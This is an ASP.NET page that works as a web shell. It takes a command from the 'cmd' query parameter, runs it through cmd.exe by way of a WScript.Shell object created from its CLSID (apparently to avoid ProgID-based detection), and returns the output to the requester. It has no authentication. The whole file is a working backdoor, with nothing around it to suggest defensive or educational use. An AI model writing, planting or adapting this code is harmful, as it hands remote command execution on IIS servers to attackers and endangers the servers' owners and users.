<%@ Page Language="C#" %>
<%
string command = Request.QueryString["cmd"];
if (!string.IsNullOrEmpty(command))
{
    try
    {
        // 使用 System.Type.GetTypeFromCLSID 来创建 WScript.Shell 对象
        Type shellType = Type.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8"));
        dynamic shell = Activator.CreateInstance(shellType);
        dynamic exec = shell.Exec("cmd.exe /c " + command);
        dynamic stdout = exec.StdOut;
        string output = "";
        while (!stdout.AtEndOfStream)
        {
            output += stdout.ReadLine() + "\n";
        }
        Response.Write(output);
    }
    catch (Exception ex)
    {
        Response.Write($"Error: {Server.HtmlEncode(ex.Message)}");
    }
}
else
{
    Response.Write("No command");
}
%>